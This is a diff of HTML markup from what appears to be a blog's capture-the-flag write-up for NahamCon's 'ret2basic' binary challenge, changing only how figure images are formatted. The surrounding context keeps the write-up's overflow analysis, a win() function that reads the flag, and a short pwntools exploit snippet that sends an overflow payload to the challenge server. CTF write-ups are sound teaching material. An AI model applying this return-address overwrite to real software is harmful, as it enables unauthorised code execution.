@@ -259,18 +259,15 @@ Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [1]    9615 segmentation fault  ./ret2basic
 $
 </code></pre></div><p>Disassembling the binary, we find that <code>main()</code> eventually calls <code>vuln</code> where the overflow exists.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/nahamcon/ret2basic_vuln.png"/> 
+<figure><img src="https://leonjza.github.io/images/nahamcon/ret2basic_vuln.png"/>
 </figure>
 
 <p>A function called <code>win()</code> also exists, which will read the flag to us if we could reach it.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/nahamcon/ret2basic_win.png"/> 
+<figure><img src="https://leonjza.github.io/images/nahamcon/ret2basic_win.png"/>
 </figure>
 
 <p>In <code>gdb</code> we can see the overflow smashing the stack, causing the <code>ret</code> from <code>vuln()</code> to crash.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/nahamcon/ret2basic_rsp.png"/> 
+<figure><img src="https://leonjza.github.io/images/nahamcon/ret2basic_rsp.png"/>
 </figure>
 
 <p>The binary does not have an executable stack, but we can replace the address at the right location so that the <code>ret</code> call redirects the program counter to <code>win()</code>.</p>
@@ -316,8 +313,7 @@ payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A
 conn = remote(<span style="color:#87ceeb">&#34;challenge.nahamcon.com&#34;</span>, <span style="color:#f60">30159</span>)
 conn.sendline(payload)
 conn.interactive()
-</code></pre></div><figure>
-    <img src="https://leonjza.github.io/images/nahamcon/ret2basic_pwn.png"/> 
+</code></pre></div><figure><img src="https://leonjza.github.io/images/nahamcon/ret2basic_pwn.png"/>
 </figure>
 
 
